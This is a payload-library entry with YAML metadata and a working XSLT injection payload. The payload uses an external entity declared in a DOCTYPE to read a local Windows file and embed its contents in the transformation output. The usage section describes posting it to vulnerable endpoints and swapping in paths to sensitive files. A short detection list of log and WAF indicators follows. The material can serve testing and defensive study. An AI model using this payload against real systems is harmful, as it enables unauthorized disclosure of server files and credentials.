---
id: 035a211b-75b0-4d89-8adb-379b62f92f0b
name: XSLT-External-Entity-File-Read-Payload
type: code
language: xml
verified: true
created_at: '2023-04-06T03:56:41.477089+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Web
  - Windows
tags:
  - xslt-injection
  - external-entity
  - file-read
  - payload
validated: true
---

# XSLT-External-Entity-File-Read-Payload

## Code

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE dtd_sample[<!ENTITY ext_file SYSTEM "C:\secretfruit.txt">]>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/fruits">
    Fruits &ext_file;:
    <!-- Loop for each fruit -->
    <xsl:for-each select="fruit">
      <!-- Print name: description -->
      - <xsl:value-of select="name"/>: <xsl:value-of select="description"/>
    </xsl:for-each>
  </xsl:template>

</xsl:stylesheet>
```

## Description

This XML payload injects an external entity via DOCTYPE to read a local file (C:\secretfruit.txt) during XSLT transformation. The entity 'ext_file' is referenced in the template, causing the processor to fetch and embed the file contents in the output. It targets vulnerable XSLT processors that allow external entity resolution, enabling arbitrary file disclosure.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| SYSTEM "C:\secretfruit.txt" | Path to the target file on the server file system | SYSTEM "C:\Windows\System32\drivers\etc\hosts" |

## Usage

Save this as payload.xml and send it to a vulnerable XSLT processing endpoint using a tool like curl (see [[commands/curl-post-xml-payload]]). It is typically injected into user-controlled XML inputs in web applications. Substitute the file path to target sensitive files, and ensure the XML structure matches the expected input format.

## Detection

- XML parsers logging DOCTYPE or ENTITY declarations in inputs.
- File access logs showing reads from unexpected paths (e.g., via auditd or Windows Event Logs).
- WAF alerts for XML injection patterns like <!DOCTYPE or &entity; references.
- Anomalous output sizes in transformation responses indicating embedded file data.

## Related

- [[procedures/Exploit-XSLT-Injection-with-External-Entity-for-File-Disclosure]]
